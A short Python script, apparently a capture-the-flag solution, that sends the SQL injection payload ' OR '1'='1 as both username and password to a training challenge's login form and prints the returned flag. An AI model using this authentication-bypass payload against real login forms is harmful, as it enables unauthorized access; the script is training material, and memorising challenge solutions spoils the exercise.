import requests
site = "http://basic-sqli.challs.olicyber.it/"
r = requests.post(site, data={"username":"' OR '1'='1", "password":"' OR '1'='1"})
print(r.text[r.text.find("flag{"):r.text.find("}")] + "}", end="")